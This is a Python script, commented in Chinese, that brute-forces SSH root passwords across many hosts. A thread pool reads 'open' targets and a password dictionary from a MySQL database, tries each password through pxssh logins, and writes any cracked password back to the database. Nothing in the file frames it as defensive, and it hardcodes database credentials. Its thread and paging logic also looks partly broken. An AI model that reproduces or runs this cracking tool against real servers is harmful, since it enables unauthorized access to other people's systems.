#!/usr/bin/python3
# coding: utf-8
'''
暴力破解ssh，root用户的密码，线程池
'''
from pexpect import pxssh
from threading import *
from databaseHelper import DatabaseHelper
import time

class CrackSSHWorkInfo:
  def __init__(self, id, host, password, user='root'):
    self._user = user
    self._password = password
    self._host = host
    self._id = id
    self.pageSize = 100
    self.pageIndex = 1
    self.skipSave = 11
    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
    
  def _checkPassword(self, password):
    try:
      s = pxssh.pxssh()
      s.login(self._host, self._user, password)
      s.logout()
    except Exception as e:
      # print('[-] password: {1} Login Fail..., ErrorInfo: {0}'.format(e, password))
      return False
    return True

  def _saveWorkInfo(self, password, crackState):
    self.dbHelper.nonQuery('update crackResult set password = %s, crackState = %s where id = %s', (password, crackState, self._id))

  def workThread(self, lock):
    try:
      tryCount = 0
      totalTime = 0
      if self._password == None:
        results = self.dbHelper.pageQuery('select val from password order by val', pageIndex = 1, pageSize = self.pageSize)
      else:
        results = self.dbHelper.pageQuery('select val from password where val > %s order by val', (self._password,), self.pageSize, self.pageSize)

      while (len(results) > 0):
        start1 = time.time()
        for result in results:
          tryCount += 1
          start = time.time()
          if self._checkPassword(result['val']):
            self._saveWorkInfo(result['val'], OKCRACK)
            return
          else:
            tryCount %= self.skipSave
            if (tryCount == 0):
              self._saveWorkInfo(result['val'], CRACKING)
          totalTime += time.time() - start
        self.pageSize += 1
        results = self.dbHelper.pageQuery('select val from password where val > %s order by val', (self._password,), self.pageSize, self.pageSize)
        print('%f, %f' %(time.time() - start1, totalTime))

      else:
        self._saveWorkInfo('', ENDCRACK)
    except Exception as e:
      print(str(e))
    
class CrackSSHThreadPool:
  def __init__(self, count):
    self.threadLock = BoundedSemaphore(value=count)
    self._schedule = SSHScheduler()

  def startThreadPool(self):
    while True:
      self.threadLock.acquire()
      workInfo = self._schedule.getNextWork()
      if workInfo == None:
        self.threadLock.release()
        continue
      t = Thread(target= workInfo.workThread, args=(self.threadLock,))
      t.start()

class SSHScheduler:
  def __init__(self):
    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
    self.dbHelper.nonQuery('update crackResult set crackState = %s where crackState = %s', (NOSTART,CRACKING))
  
  def getNextWork(self):
    dictResult = self.dbHelper.queryOne('select id, host, password from crackResult where state = %s and crackState = %s order by id asc', ('open', NOSTART))
    if dictResult == None:
      return None
    self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (CRACKING, dictResult['id']))
    return CrackSSHWorkInfo(dictResult['id'], dictResult['host'], dictResult['password'])

NOSTART = 0 # 还没开始
CRACKING = 1 # 正在匹配密码
ENDCRACK = 2 # 没有匹配到密码
OKCRACK = 3 # 已经匹配到密码

if __name__ == '__main__':
  csPool = CrackSSHThreadPool(10)
  csPool.startThreadPool()

